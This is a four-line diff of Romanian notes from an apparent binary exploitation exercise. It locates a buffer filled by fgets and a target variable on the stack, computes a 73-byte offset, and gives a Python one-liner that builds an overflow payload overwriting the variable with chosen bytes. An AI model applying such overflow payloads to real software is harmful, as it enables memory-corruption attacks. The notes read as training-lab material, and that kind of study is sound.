@@ -1,0 +1,4 @@
+bufferul se afla la adresa epb - 89 (ne uitam la apelul lui fgets)
+variabila se afla la adresa ebp - 16
+deci avem de suprascris 73 de octeti + variabila
+python -c 'print "A"*73 + "\x4D\x49\x41\x55"' > payload
